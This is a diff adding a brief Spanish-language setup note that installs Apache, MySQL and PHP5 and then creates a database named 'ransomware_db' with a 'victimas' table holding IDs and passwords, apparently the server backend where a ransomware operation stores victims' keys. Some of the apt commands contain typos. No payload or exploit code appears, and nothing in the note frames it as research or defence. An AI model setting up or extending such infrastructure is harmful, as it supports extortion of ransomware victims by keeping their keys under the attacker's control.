@@ -1,0 +1,24 @@
+instalar lo siguiente:
+
+Instalar Servidor Apache:
+sudo apt -get update
+sudo apt -get install apache2
+
+Instalar Servidor Mysql
+sudo apt-get install mysql-server
+
+Instalar PHP5
+sudo apt-get install libapache2-mod-php5 php5 php5-mcrypt php5-mysql
+
+---------------------------------------------------------------
+
+crear base de datos
+
+CREATE DATABASE ransomware_db;
+USE ransomware_db;
+CREATE TABLE victimas (ID int NOT NULL AUTO_INCREMENT,
+                       IDD varchar(35),
+                       PASS varchar(35),
+                       PRIMARY KEY (ID));
+                       
+                       
